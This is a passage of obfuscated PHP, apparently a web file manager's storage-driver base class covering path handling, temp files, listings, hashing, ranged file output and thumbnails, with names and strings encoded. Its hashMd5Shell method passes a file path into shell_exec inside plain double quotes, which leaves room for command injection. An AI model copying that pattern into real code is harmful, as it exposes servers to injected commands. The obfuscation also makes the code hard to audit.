$_SERVER[Å¶¨Şêº]; $ø÷±›„Ÿ = str_replace($Õ‘¨Õæ[85], $Õ‘¨Õæ[12], get_class($this)); return strtolower($ø÷±›„Ÿ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ô…Åº„, $Æéì„Ñã) { $–Í‹ıı… =& $_SERVER[Å¶¨Şêº]; $õùè€» = rtrim($Ô…Åº„, $–Í‹ıı…[8]) . $–Í‹ıı…[8] . $Æéì„Ñã; $ºÉê”î¯ = $this->exist($õùè€»); return $ºÉê”î¯ ? $õùè€» : !1; } public function setModifyTime($’˜‘¦¡û, $¶…ìğ¥š = '') { } public function renameObject($óØÕâÏ, $¼Û¹îğè) { $§âÓ¯© = $¼Û¹îğè; $óØÕâÏ = $this->getPathOuter($óØÕâÏ); $¼Û¹îğè = $this->pathFather($óØÕâÏ) . $¼Û¹îğè; $€­ÒÒ³Ó = IO::copy($óØÕâÏ, $this->pathFather($óØÕâÏ), REPEAT_RENAME_FOLDER, $§âÓ¯©); if ($€­ÒÒ³Ó) { IO::remove($óØÕâÏ); } return $€­ÒÒ³Ó ? $¼Û¹îğè : !1; } public function tempFile($‹’ùí = '', $Í£ÕàÅ = '') { if (!$‹’ùí) { $‹’ùí = rand_string(15); } $İ™‡ºÍÂ = TEMP_FILES . rand_string(15) . $_SERVER[Å¶¨Şêº][8]; @mkdir($İ™‡ºÍÂ, DEFAULT_PERRMISSIONS, !0); $¤äšÕ™î = $İ™‡ºÍÂ . $‹’ùí; @touch($¤äšÕ™î); if ($Í£ÕàÅ) { file_put_contents($¤äšÕ™î, $Í£ÕàÅ); } return $¤äšÕ™î; } public function tempFileRemve($¾Ç«‹Øñ) { @unlink($¾Ç«‹Øñ); @rmdir($this->pathFather($¾Ç«‹Øñ)); } public function mkfile($ŠÀÄØ­, $ããå‡£ = '', $Ó“šşù‚ = REPEAT_RENAME) { } public function mkdir($»¥àÕ, $ °öá£´ = REPEAT_SKIP) { } public function delFile($Æõó“ŞÑ) { } public function delFolder($“å©íŒ) { } public function copyFile($„Ø˜À¬Ó, $›šÈéŸá) { } public function moveFile($ü„Ë£®”, $Äï¡ô÷È) { } public function remove($ÖªååÁ) { if ($this->isFile($ÖªååÁ)) { return $this->delFile($ÖªååÁ); } return $this->delFolder($ÖªååÁ); } public function rename($œÈ—ø€, $…Ù‰áâ) { } public function exist($Í¬ŠŠÕ±) { } public function findByHash($Ÿ¹Òì´ = '', $Ø÷ˆƒÄ© = '') { return !1; } public function isFile($éà›Àƒ) { } public function isFolder($Û¼öŞš·) { } public function size($âÏî”í¼) { } public function info($êã¡êÁ) { } public function infoSimple($Ê¥«‡Ã) { return $this->info($Ê¥«‡Ã); } public function infoAuth($ÇÒí¼é) { return $this->info($ÇÒí¼é); } public function infoFull($ÙûßŸÉ) { return $this->info($ÙûßŸÉ); } public function infoWithChildren($´‚˜ãÆ­) { $ª—ÌÀ¹ü =& $_SERVER[Å¶¨Şêº]; static $ß¹»Û¬ = array(); if (isset($ß¹»Û¬[$´‚˜ãÆ­])) { return $ß¹»Û¬[$´‚˜ãÆ­]; } $Ñİ´ôÆï = $this->info($´‚˜ãÆ­); if ($Ñİ´ôÆï && $Ñİ´ôÆï[$ª—ÌÀ¹ü[43]] == $ª—ÌÀ¹ü[86]) { $£„¡ŸãÆ = array($ª—ÌÀ¹ü[87] => 0, $ª—ÌÀ¹ü[88] => 0, $ª—ÌÀ¹ü[89] => 0); $this->infoChildren($´‚˜ãÆ­, $£„¡ŸãÆ); $Ñİ´ôÆï[$ª—ÌÀ¹ü[87]] = $£„¡ŸãÆ[$ª—ÌÀ¹ü[87]]; $Ñİ´ôÆï[$ª—ÌÀ¹ü[90]] = array($ª—ÌÀ¹ü[91] => $£„¡ŸãÆ[$ª—ÌÀ¹ü[88]], $ª—ÌÀ¹ü[92] => $£„¡ŸãÆ[$ª—ÌÀ¹ü[89]]); $ß¹»Û¬[$´‚˜ãÆ­] = $Ñİ´ôÆï; } return $Ñİ´ôÆï; } public function listPath($ÃĞÀà‚Å, $Œ¥Ş“¼Ù = false) { } public function has($Àª€ñ·Š, $éŞ„”Ó = false, $å¬¯¥¿ù = false) { } public function canRead($£Îè·Ä) { } public function canWrite($ˆÓ¨óÄÂ) { } public function getContent($ÂÛÏ³’í) { } public function setContent($÷®÷Šİ, $¬ôÅ„úÊ = '') { } protected function infoChildren($Ì¢Íìœ, &$àúÄé) { $¶ßÓ‰–· =& $_SERVER[Å¶¨Şêº]; check_abort_echo(); $Ç†äÛıš = $this->listPath($Ì¢Íìœ, !0); $Ç†äÛıš = array_merge($Ç†äÛıš[$¶ßÓ‰–·[93]], $Ç†äÛıš[$¶ßÓ‰–·[94]]); foreach ($Ç†äÛıš as $ÚÊóå¸) { if ($ÚÊóå¸[$¶ßÓ‰–·[43]] == $¶ßÓ‰–·[86]) { $àúÄé[$¶ßÓ‰–·[89]]++; $Ëù“¶ƒ = $this->getPathInner($ÚÊóå¸[$¶ßÓ‰–·[95]]); $this->infoChildren($Ëù“¶ƒ, $àúÄé); } else { $àúÄé[$¶ßÓ‰–·[88]]++; $àúÄé[$¶ßÓ‰–·[87]] += $ÚÊóå¸[$¶ßÓ‰–·[87]]; } } } public function fileSubstr($«İï¬‘Û, $’¹ğ¯ï, $±ÖÏÒõí) { } public function listAll($¸¦Ä¾šÏ) { } public function listAllMake($÷ÏôËÖ§, &$¿Ñ„©©) { $å”óÎáÜ =& $_SERVER[Å¶¨Şêº]; check_abort_echo(); $¹‚Š¤•¦ = $this->listPath($÷ÏôËÖ§, !0); if (!$¹‚Š¤•¦) { return; } $æøèÏÌå = array_merge($¹‚Š¤•¦[$å”óÎáÜ[93]], $¹‚Š¤•¦[$å”óÎáÜ[94]]); foreach ($æøèÏÌå as $ïÃÁ¨¤…) { $–ŠİÉª = $ïÃÁ¨¤…[$å”óÎáÜ[43]] == $å”óÎáÜ[86]; $î¦é½°ì = array($å”óÎáÜ[95] => $ïÃÁ¨¤…[$å”óÎáÜ[95]], $å”óÎáÜ[86] => $–ŠİÉª); if (isset($ïÃÁ¨¤…[$å”óÎáÜ[87]])) { $î¦é½°ì[$å”óÎáÜ[87]] = $ïÃÁ¨¤…[$å”óÎáÜ[87]]; } if (isset($ïÃÁ¨¤…[$å”óÎáÜ[96]])) { $î¦é½°ì[$å”óÎáÜ[96]] = $ïÃÁ¨¤…[$å”óÎáÜ[96]]; } if (!$–ŠİÉª) { $¿Ñ„©©[] = $î¦é½°ì; continue; } $¿Ñ„©©[] = $î¦é½°ì; $óÒêÙ = $ïÃÁ¨¤…[$å”óÎáÜ[95]]; $ª¤ËÓ‘¯ = $this->pathDriver; if (substr($ïÃÁ¨¤…[$å”óÎáÜ[95]], 0, strlen($ª¤ËÓ‘¯)) == $ª¤ËÓ‘¯) { $óÒêÙ = substr($óÒêÙ, strlen($ª¤ËÓ‘¯)); } $this->listAllMake($óÒêÙ, $¿Ñ„©©); } } public function listAllSimple($è¥ÕÉĞ, $Œ¨ëĞâ¶ = false) { $üİ¯±áú = $this->listAll($è¥ÕÉĞ); return $this->listAllSimpleMake($üİ¯±áú, $this->getPathOuter($è¥ÕÉĞ), $Œ¨ëĞâ¶); } public function listAllSimpleMake($ıŠŞæîÙ, $½ÁšÈ‰, $‹óóÃ¬) { $û˜òÆïó =& $_SERVER[Å¶¨Şêº]; $Ğ³â¢®ğ = array(); $½ÁšÈ‰ = rtrim(get_path_father($½ÁšÈ‰), $û˜òÆïó[8]) . $û˜òÆïó[8]; foreach ($ıŠŞæîÙ as $ñª†ÖŸ) { $”äİå±ş = array($û˜òÆïó[95] => $ñª†ÖŸ[$û˜òÆïó[95]], $û˜òÆïó[97] => $ñª†ÖŸ[$û˜òÆïó[95]], $û˜òÆïó[86] => $ñª†ÖŸ[$û˜òÆïó[86]]); if (isset($ñª†ÖŸ[$û˜òÆïó[87]]) && !$ñª†ÖŸ[$û˜òÆïó[86]]) { $”äİå±ş[$û˜òÆïó[87]] = $ñª†ÖŸ[$û˜òÆïó[87]]; } if (isset($ñª†ÖŸ[$û˜òÆïó[96]])) { $”äİå±ş[$û˜òÆïó[96]] = $ñª†ÖŸ[$û˜òÆïó[96]]; } if (is_array($ñª†ÖŸ[$û˜òÆïó[98]])) { $”äİå±ş[$û˜òÆïó[97]] = $ñª†ÖŸ[$û˜òÆïó[98]][$û˜òÆïó[95]]; $”äİå±ş[$û˜òÆïó[87]] = $ñª†ÖŸ[$û˜òÆïó[98]][$û˜òÆïó[87]]; $”äİå±ş[$û˜òÆïó[96]] = $ñª†ÖŸ[$û˜òÆïó[98]][$û˜òÆïó[96]]; } else { if (substr($ñª†ÖŸ[$û˜òÆïó[95]], 0, strlen($½ÁšÈ‰)) == $½ÁšÈ‰) { $”äİå±ş[$û˜òÆïó[95]] = substr($ñª†ÖŸ[$û˜òÆïó[95]], strlen($½ÁšÈ‰)); } } $Æ¤ğ®Á› = $ñª†ÖŸ[$û˜òÆïó[86]] ? $û˜òÆïó[8] : $û˜òÆïó[12]; $”äİå±ş[$û˜òÆïó[97]] = rtrim($”äİå±ş[$û˜òÆïó[97]], $û˜òÆïó[8]) . $Æ¤ğ®Á›; $”äİå±ş[$û˜òÆïó[95]] = $û˜òÆïó[8] . trim($”äİå±ş[$û˜òÆïó[95]], $û˜òÆïó[8]) . $Æ¤ğ®Á›; if (!$‹óóÃ¬) { $çº¶¥óñ = explode($û˜òÆïó[8], trim($”äİå±ş[$û˜òÆïó[95]], $û˜òÆïó[8])); $”äİå±ş[$û˜òÆïó[95]] = $û˜òÆïó[8] . implode($û˜òÆïó[8], array_slice($çº¶¥óñ, 1)) . $Æ¤ğ®Á›; } $Ğ³â¢®ğ[] = $”äİå±ş; } return array_sort_by($Ğ³â¢®ğ, $û˜òÆïó[95]); } public function upload($ÁÈ¾…ê, $’ÚËòŸ‡, $¦ÇõÎ“ = false, $©Êµîší = REPEAT_REPLACE) { } public function uploadFileByID($£ô¼Å, $ÕÙœªš, $§Ä¹Ò„) { } public function uploadFileByPath($×áë¼ó±, $‹±·üãü, $á ”Ú»¤ = array()) { } public function isUploadServer() { $®•»í  =& $_SERVER[Å¶¨Şêº]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $®•»í [99]) { return !0; } return $GLOBALS[$®•»í [6]][$®•»í [100]][$®•»í [101]]; } public function isFileOutServer() { $¼Ñ‘¨Ğ =& $_SERVER[Å¶¨Şêº]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¼Ñ‘¨Ğ[99]) { return !0; } return $GLOBALS[$¼Ñ‘¨Ğ[6]][$¼Ñ‘¨Ğ[100]][$¼Ñ‘¨Ğ[102]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¸¼â¥µ’) { $û¸Ë“üı =& $_SERVER[Å¶¨Şêº]; if (!$this->isCdnHost()) { return $¸¼â¥µ’; } return str_replace(trim(get_url_root($¸¼â¥µ’), $û¸Ë“üı[8]), trim($this->cdnHost, $û¸Ë“üı[8]), $¸¼â¥µ’); } public function uploadLink($†êˆğ’², $ù¡­Ë½» = 0) { $³·öË¯º =& $_SERVER[Å¶¨Şêº]; if ($this->isUploadServer()) { return; } $“²½¬æ  = $this->getType(); if (!in_array($“²½¬æ , $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‰„†¹ÃÀ = 1024 * 1024 * 10; $«éº¼€³ = $ù¡­Ë½» <= $‰„†¹ÃÀ ? $³·öË¯º[103] : $³·öË¯º[104]; $ñı´»âÚ = (!$ù¡­Ë½» ? 1 : ceil($ù¡­Ë½» / pow(1024, 3))) * 3600 * 4; $¥Ö¢„‰Ê = $this->{$«éº¼€³}($†êˆğ’², $ñı´»âÚ); if ($¥Ö¢„‰Ê) { $¥Ö¢„‰Ê[$³·öË¯º[105]] = $†êˆğ’²; $¥Ö¢„‰Ê[$³·öË¯º[106]] = $“²½¬æ ; } return $¥Ö¢„‰Ê; } public function uploadFormData($ŞÛá€ßˆ, $„ğ“Ïªş = 3600) { } public function multiUploadFormData($¨ÃåØÆ», $‡ÇÈ‚éã = 3600) { } public function download($¯ˆ¨“¾ª, $ğ‹¤€ş¸) { } public function ext($‹§¨á‚») { $ı²ÔŠ =& $_SERVER[Å¶¨Şêº]; if (strpos($‹§¨á‚», $ı²ÔŠ[8]) === -1) { $¿´ŞÛ© = $‹§¨á‚»; } else { $¿´ŞÛ© = $this->pathThis($‹§¨á‚»); } $şÇúÎÈ = $ı²ÔŠ[12]; if (strstr($¿´ŞÛ©, $ı²ÔŠ[10])) { $şÇúÎÈ = substr($¿´ŞÛ©, strrpos($¿´ŞÛ©, $ı²ÔŠ[10]) + 1); $şÇúÎÈ = strtolower($şÇúÎÈ); } if (strlen($şÇúÎÈ) > 3 && preg_match($ı²ÔŠ[107], $şÇúÎÈ, $ôÎ•Ñ¢û)) { $şÇúÎÈ = $ı²ÔŠ[12]; } return $şÇúÎÈ; } public function pathThis($˜ïªÌ†ç) { $èÍ»éç… =& $_SERVER[Å¶¨Şêº]; $˜ïªÌ†ç = str_replace($èÍ»éç…[108], $èÍ»éç…[8], rtrim($˜ïªÌ†ç, $èÍ»éç…[8])); $×ø›»ÁÃ = strrpos($˜ïªÌ†ç, $èÍ»éç…[8]); if ($×ø›»ÁÃ === !1) { return $˜ïªÌ†ç; } return substr($˜ïªÌ†ç, $×ø›»ÁÃ + 1); } public function pathFather($…Ş®çõ¨) { $ß¦Ÿ†øş =& $_SERVER[Å¶¨Şêº]; $…Ş®çõ¨ = str_replace($ß¦Ÿ†øş[108], $ß¦Ÿ†øş[8], rtrim($…Ş®çõ¨, $ß¦Ÿ†øş[8])); $Ş¦ŞÙ¾Ä = strrpos($…Ş®çõ¨, $ß¦Ÿ†øş[8]); if ($Ş¦ŞÙ¾Ä === !1) { return $ß¦Ÿ†øş[12]; } return substr($…Ş®çõ¨, 0, $Ş¦ŞÙ¾Ä + 1); } public function hashSimple($™ü°“Íô) { $›ãÜĞï =& $_SERVER[Å¶¨Şêº]; if (!$™ü°“Íô) { return md5($›ãÜĞï[12]); } $¦†ôÅ×Õ = $this->size($™ü°“Íô); $Á§›û€ï = 200; $ü¹ÌúŸ = 50; if ($¦†ôÅ×Õ <= $Á§›û€ï * $ü¹ÌúŸ) { return $this->hashMd5($™ü°“Íô) . $¦†ôÅ×Õ; } $«î­§Öİ = intval($¦†ôÅ×Õ / $ü¹ÌúŸ); $ˆ§–Á¬ = $›ãÜĞï[12]; for ($²Æ à½ = 0; $²Æ à½ < $ü¹ÌúŸ; $²Æ à½++) { $ˆ§–Á¬ .= $this->fileSubstr($™ü°“Íô, $«î­§Öİ * $²Æ à½, $Á§›û€ï); } $ˆ§–Á¬ .= $this->fileSubstr($™ü°“Íô, $¦†ôÅ×Õ - $Á§›û€ï, $Á§›û€ï); return md5($ˆ§–Á¬) . $¦†ôÅ×Õ; } public static $md5Cache = array(); public function hashMd5($Ï›È’ËÛ) { if (!$Ï›È’ËÛ) { return md5($_SERVER[Å¶¨Şêº][12]); } $Ï›È’ËÛ = $this->iconvSystem($Ï›È’ËÛ); if (isset(self::$md5Cache[$Ï›È’ËÛ])) { return self::$md5Cache[$Ï›È’ËÛ]; } self::$md5Cache[$Ï›È’ËÛ] = $this->hashMd5Shell($Ï›È’ËÛ); if (!self::$md5Cache[$Ï›È’ËÛ]) { self::$md5Cache[$Ï›È’ËÛ] = @md5_file($Ï›È’ËÛ); } return self::$md5Cache[$Ï›È’ËÛ]; } private function hashMd5Shell($™‚Êáê—) { $˜Ó•ú¯“ =& $_SERVER[Å¶¨Şêº]; if (!$™‚Êáê—) { return md5($˜Ó•ú¯“[12]); } if (!function_exists($˜Ó•ú¯“[109])) { return !1; } $Í¹õ²Š  = array($˜Ó•ú¯“[110], $˜Ó•ú¯“[111]); $Õï¨í‚¯ = Cache::get($˜Ó•ú¯“[112]); if (!$Õï¨í‚¯) { $ŠÑ‡ıØª = BASIC_PATH . $˜Ó•ú¯“[113]; $°ÚÎéÎı = md5_file($ŠÑ‡ıØª); $Õï¨í‚¯ = $˜Ó•ú¯“[114]; foreach ($Í¹õ²Š  as $öğÜšş¼) { $´£ÖĞÒ¨ = shell_exec($öğÜšş¼ . "\x20\42{$ŠÑ‡ıØª}\x22"); if ($´£ÖĞÒ¨ && substr(trim($´£ÖĞÒ¨), 0, 32) == $°ÚÎéÎı) { $Õï¨í‚¯ = $öğÜšş¼; break; } } Cache::set($˜Ó•ú¯“[112], $Õï¨í‚¯, 3600); } if ($Õï¨í‚¯ == $˜Ó•ú¯“[114]) { return !1; } $´£ÖĞÒ¨ = shell_exec($Õï¨í‚¯ . "\40\42{$™‚Êáê—}\42"); $´£ÖĞÒ¨ = str_replace($˜Ó•ú¯“[115], $˜Ó•ú¯“[12], $´£ÖĞÒ¨); return substr($´£ÖĞÒ¨, 0, 32); } public function link($½ŞÈ“Õ™) { return $½ŞÈ“Õ™; } public function fileOut($°ˆİèÔ, $÷Ô“›Ô = false, $Âè•¥‚­ = false, $º¨‹¼ò = '') { $£ŒØñŠ• =& $_SERVER[Å¶¨Şêº]; $this->cacheMethod(null, null); if (!$°ˆİèÔ || !$this->exist($°ˆİèÔ)) { show_json(LNG($£ŒØñŠ•[116]), !1, $Âè•¥‚­); } $¬—Äª‡Ö = $this->getType() == $£ŒØñŠ•[117]; $©´ĞÚà = $GLOBALS[$£ŒØñŠ•[6]][$£ŒØñŠ•[100]][$£ŒØñŠ•[118]][$£ŒØñŠ•[119]]; $”ª‡ = (double) $GLOBALS[$£ŒØñŠ•[6]][$£ŒØñŠ•[100]][$£ŒØñŠ•[118]][$£ŒØñŠ•[120]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $´É¨œ¨Â = $this->infoFull($°ˆİèÔ); $àøğ·Šú = $´É¨œ¨Â[$£ŒØñŠ•[87]]; $ß„Ÿ¶Ñæ = gmdate($£ŒØñŠ•[121], $´É¨œ¨Â[$£ŒØñŠ•[96]]); $¶ŞÆƒ = $Âè•¥‚­ ? $Âè•¥‚­ : $this->iconvApp($´É¨œ¨Â[$£ŒØñŠ•[42]]); $ô§Óëû = 0; $ˆ­şü¨ = $àøğ·Šú - 1; $ÌÌ†€—Ô = $this->ext($¶ŞÆƒ); if (in_array($ÌÌ†€—Ô, array($£ŒØñŠ•[122], $£ŒØñŠ•[123], $£ŒØñŠ•[124], $£ŒØñŠ•[125]))) { $ÌÌ†€—Ô = $£ŒØñŠ•[126]; } if (in_array($ÌÌ†€—Ô, array($£ŒØñŠ•[127]))) { $ÌÌ†€—Ô = $£ŒØñŠ•[128]; } if (!$º¨‹¼ò) { $º¨‹¼ò = md5($ß„Ÿ¶Ñæ . $this->hashSimple($°ˆİèÔ)); } $º¨‹¼ò = $£ŒØñŠ•[129] . $º¨‹¼ò . $£ŒØñŠ•[129]; $éŸ×Ì§¦ = get_file_mime($ÌÌ†€—Ô); $©Û˜¦† = !0; $©Û˜¦† = isset($_GET[$£ŒØñŠ•[130]]) ? !1 : !0; if ($÷Ô“›Ô === !1 && !mime_support($éŸ×Ì§¦)) { $éŸ×Ì§¦ = $£ŒØñŠ•[131]; } header($£ŒØñŠ•[132]); header($£ŒØñŠ•[133] . $éŸ×Ì§¦); $†”¹Âû³ = rawurlencode($¶ŞÆƒ); $†”¹Âû³ = $£ŒØñŠ•[129] . $†”¹Âû³ . $£ŒØñŠ•[134] . $†”¹Âû³; if ($÷Ô“›Ô) { header($£ŒØñŠ•[135]); header($£ŒØñŠ•[136] . $†”¹Âû³); } else { if ($©Û˜¦†) { header($£ŒØñŠ•[137] . $†”¹Âû³); } } header($£ŒØñŠ•[138] . gmdate($£ŒØñŠ•[121], time() + 3600 * 24 * 30) . $£ŒØñŠ•[139]); header($£ŒØñŠ•[140]); header($£ŒØñŠ•[141]); header($£ŒØñŠ•[142]); if (isset($_SERVER[$£ŒØñŠ•[143]]) && strtotime($_SERVER[$£ŒØñŠ•[143]]) == $´É¨œ¨Â[$£ŒØñŠ•[96]]) { header($£ŒØñŠ•[144], !0, 304); die; } if (isset($_SERVER[$£ŒØñŠ•[145]]) && $_SERVER[$£ŒØñŠ•[145]] == $º¨‹¼ò) { header($£ŒØñŠ•[146] . $º¨‹¼ò, !0, 304); die; } header($£ŒØñŠ•[146] . $º¨‹¼ò); header($£ŒØñŠ•[147] . $ß„Ÿ¶Ñæ . $£ŒØñŠ•[139]); header($£ŒØñŠ•[148] . $¶ŞÆƒ); header($£ŒØñŠ•[149]); header($£ŒØñŠ•[150] . $àøğ·Šú); header($£ŒØñŠ•[151]); if (!$÷Ô“›Ô && $ÌÌ†€—Ô == $£ŒØñŠ•[152]) { if ($àøğ·Šú > 1024 * 1024 * 5) { die; } $Ğ…È‡·™ = $this->getContent($°ˆİèÔ); $Ğ…È‡·™ = Html::clearSVG($Ğ…È‡·™); header($£ŒØñŠ•[153] . strlen($Ğ…È‡·™)); echo $Ğ…È‡·™; die; } $êü©‘¬ = strtolower($_SERVER[$£ŒØñŠ•[154]]); if ($¬—Äª‡Ö && $êü©‘¬ && $©´ĞÚà) { if (strstr($êü©‘¬, $£ŒØñŠ•[155])) { header($£ŒØñŠ•[156] . $°ˆİèÔ); } else { if (strstr($êü©‘¬, $£ŒØñŠ•[157])) { header($£ŒØñŠ•[158] . $°ˆİèÔ); } else { if (strstr($êü©‘¬, $£ŒØñŠ•[159])) { header($£ŒØñŠ•[160] . $°ˆİèÔ); } } } if ($”ª‡) { header($£ŒØñŠ•[161] . $”ª‡); } return; } if (isset($_SERVER[$£ŒØñŠ•[162]])) { if (preg_match($£ŒØñŠ•[163], $_SERVER[$£ŒØñŠ•[162]], $µàÑ˜™ä)) { $ô§Óëû = intval($µàÑ˜™ä[1]); $ô§Óëû = $ô§Óëû <= 0 ? 0 : ($ô§Óëû >= $ˆ­şü¨ ? $ˆ­şü¨ : $ô§Óëû); if (!empty($µàÑ˜™ä[2])) { $®‹â÷Ôû = intval($µàÑ˜™ä[2]); $ˆ­şü¨ = $®‹â÷Ôû < $ô§Óëû ? $ô§Óëû : ($®‹â÷Ôû >= $ˆ­şü¨ ? $ˆ­şü¨ : $®‹â÷Ôû); } } header($£ŒØñŠ•[164]); header("\x43\157\156\164\145\x6e\x74\x2d\x52\x61\x6e\147\145\x3a\x20\142\x79\164\x65\163\x20{$ô§Óëû}\55{$ˆ­şü¨}\x2f" . $àøğ·Šú); } else { header($£ŒØñŠ•[165]); } header($£ŒØñŠ•[166]); $ãü…ùÈî = !0; if ($_SERVER[$£ŒØñŠ•[167]] == $£ŒØñŠ•[168] && $àøğ·Šú > 1204 * 1024 * 1024 * 2) { $ãü…ùÈî = !1; } if ($ãü…ùÈî) { header($£ŒØñŠ•[169] . ($ˆ­şü¨ - $ô§Óëû + 1)); } if ($_SERVER[$£ŒØñŠ•[170]] == $£ŒØñŠ•[171]) { return; } $èÓØŸˆÄ = 1024 * 100; $ô¯£÷£ü = 0; if ($”ª‡) { $ô¯£÷£ü = intval(1000 * 1000 * ($èÓØŸˆÄ / $”ª‡)); } while ($ô§Óëû <= $ˆ­şü¨) { $È‹Ìâö = timeFloat(); check_abort(); $ á–¬ÃØ = $ˆ­şü¨ - $ô§Óëû + 1; if ($ á–¬ÃØ <= $èÓØŸˆÄ) { $èÓØŸˆÄ = $ á–¬ÃØ; } echo $this->fileSubstr($°ˆİèÔ, $ô§Óëû, $èÓØŸˆÄ); $ô§Óëû += $èÓØŸˆÄ; if ($èÓØŸˆÄ == $ á–¬ÃØ) { $ô§Óëû = $ˆ­şü¨ + 1; } if ($ô¯£÷£ü) { $¶‡ƒ“ÒÏ = intval(1000 * 1000 * (timeFloat() - $È‹Ìâö)); $ÚÀÕùâ = $ô¯£÷£ü - $¶‡ƒ“ÒÏ; if ($ÚÀÕùâ > 5) { usleep($ÚÀÕùâ); } } } } public function fileOutServer($Ó‹¬ïå, $¨’—òÁ = false, $“µÍ³‹ = false, $œŸêäØÅ = '') { $this->fileOut($Ó‹¬ïå, $¨’—òÁ, $“µÍ³‹, $œŸêäØÅ); } public function fileOutLink($Ã—¿ì¥ö) { header($_SERVER[Å¶¨Şêº][172] . $Ã—¿ì¥ö); die; } public function cacheMethod($‘§ŒĞ³Ï, $¡Ş¯«­, $‘ªó«¹Ô = null) { $ıºŞ¦Ë =& $_SERVER[Å¶¨Şêº]; static $Ùí¨Œ»ó = array(); $í³Ù¤ĞŒ = $¡Ş¯«­ ? ltrim($this->getPathOuter($¡Ş¯«­), $ıºŞ¦Ë[8]) : $ıºŞ¦Ë[12]; $–Çãá© = $ıºŞ¦Ë[173] . $‘§ŒĞ³Ï . $ıºŞ¦Ë[174] . rtrim($í³Ù¤ĞŒ, $ıºŞ¦Ë[8]); if (is_null($‘§ŒĞ³Ï)) { $Ùí¨Œ»ó = array(); return; } if (is_null($¡Ş¯«­)) { foreach ($Ùí¨Œ»ó as $–Çãá© => $¡Òòë„Ë) { if (!strstr($–Çãá©, $ıºŞ¦Ë[173] . $‘§ŒĞ³Ï . $ıºŞ¦Ë[175])) { continue; } unset($Ùí¨Œ»ó[$–Çãá©]); } return; } if (!is_null($‘ªó«¹Ô)) { $Ùí¨Œ»ó[$–Çãá©] = $‘ªó«¹Ô; return; } $­Êš¯ÜĞ = isset($Ùí¨Œ»ó[$–Çãá©]) ? $Ùí¨Œ»ó[$–Çãá©] : null; if (!is_null($­Êš¯ÜĞ)) { return $­Êš¯ÜĞ; } $­Êš¯ÜĞ = $this->{$‘§ŒĞ³Ï}($¡Ş¯«­); $Ùí¨Œ»ó[$–Çãá©] = $­Êš¯ÜĞ; return $­Êš¯ÜĞ; } public function cacheMethodInfoSet($¸ï™óî¶, $©Éş•„, $†Ó¯Ğ‚˜ = false) { $¬¤™Ù– =& $_SERVER[Å¶¨Şêº]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¬¤™Ù–[176], $¸ï™óî¶, $©Éş•„); $this->cacheMethod($¬¤™Ù–[177], $¸ï™óî¶, $©Éş•„ ? !1 : !0); if (is_array($†Ó¯Ğ‚˜)) { $this->cacheMethod($¬¤™Ù–[178], $¸ï™óî¶, $†Ó¯Ğ‚˜); } } public function fileOutImage($˜ö…Åë€, $«ôè´ê = 250) { $®³Ø«¸ =& $_SERVER[Å¶¨Şêº]; set_timeout(); if (substr($˜ö…Åë€, 0, 4) == $®³Ø«¸[159]) { $this->fileOutLink($˜ö…Åë€); } $–ñß›Çª = $this->info($˜ö…Åë€); $²¼èüÉ’ = $–ñß›Çª[$®³Ø«¸[42]]; $ÙÌéëÚ™ = !1; if (isset($GLOBALS[$®³Ø«¸[179]]) && $GLOBALS[$®³Ø«¸[179]][$®³Ø«¸[95]] == $–ñß›Çª[$®³Ø«¸[95]]) { $¶Ò¶ø¶Ü = $GLOBALS[$®³Ø«¸[179]][$®³Ø«¸[180]]; if (!$–ñß›Çª[$®³Ø«¸[181]]) { $–ñß›Çª[$®³Ø«¸[181]] = $GLOBALS[$®³Ø«¸[179]]; } if (isset($¶Ò¶ø¶Ü[$®³Ø«¸[182]])) { if ($¶Ò¶ø¶Ü[$®³Ø«¸[182]] <= $«ôè´ê && $¶Ò¶ø¶Ü[$®³Ø«¸[183]] <= $«ôè´ê) { $ÙÌéëÚ™ = !0; } } $²¼èüÉ’ = $–ñß›Çª[$®³Ø«¸[181]][$®³Ø«¸[42]]; } if ($–ñß›Çª[$®³Ø«¸[87]] <= 1024 * 50 || $ÙÌéëÚ™ || !function_exists($®³Ø«¸[184]) || $–ñß›Çª[$®³Ø«¸[185]] == $®³Ø«¸[186]) { return $this->fileOut($˜ö…Åë€, !1, $²¼èüÉ’); } if (isset($–ñß›Çª[$®³Ø«¸[181]][$®³Ø«¸[187]])) { $êÏ‹ú×• = $–ñß›Çª[$®³Ø«¸[181]][$®³Ø«¸[187]]; } else { if (isset($–ñß›Çª[$®³Ø«¸[181]][$®³Ø«¸[188]])) { $êÏ‹ú×• = $–ñß›Çª[$®³Ø«¸[181]][$®³Ø«¸[188]]; } } if (!$êÏ‹ú×•) { $êÏ‹ú×• = md5("{$–ñß›Çª[$®³Ø«¸[42]]}\137{$–ñß›Çª[$®³Ø«¸[95]]}\137{$–ñß›Çª[$®³Ø«¸[87]]}\x5f{$«ôè´ê}"); } $—Î»Çº¼ = "{$êÏ‹ú×•}\137{$«ôè´ê}\56\160\156\147"; if (!($ÀŞ’·© = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $®³Ø«¸[189]))) { $Ï¨•–¸ù = IO::mkdir(IO_PATH_SYSTEM_TEMP . $®³Ø«¸[190]); } else { $Ï¨•–¸ù = KodIO::make($ÀŞ’·©); } if ($ÀŞ’·© = IO::fileNameExist($Ï¨•–¸ù, $—Î»Çº¼)) { $Â¨ÏÑğ = KodIO::make($ÀŞ’·©); return IO::fileOut($Â¨ÏÑğ, !1, $²¼èüÉ’); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $Â¨ÏÑğ = DATA_THUMB . $—Î»Çº¼; del_file($Â¨ÏÑğ); if (!@file_exists($Â¨ÏÑğ)) { $ºúªã©– = TEMP_FILES; if (!is_dir($ºúªã©–)) { mk_dir($ºúªã©–); } $…«ù·¢‡ = $ºúªã©– . $êÏ‹ú×• . $®³Ø«¸[10] . $–ñß›Çª[$®³Ø«¸[185]]; if (!@file_exists($…«ù·¢‡)) { $…«ù·¢‡ = $this->download($˜ö…Åë€, $…«ù·¢‡); } ImageThumb::createThumb($…«ù·¢‡, $Â¨ÏÑğ, $«ôè´ê, $«ôè´ê * 10); } if (!file_exists($Â¨ÏÑğ) || filesize($Â¨ÏÑğ) < 100) { return 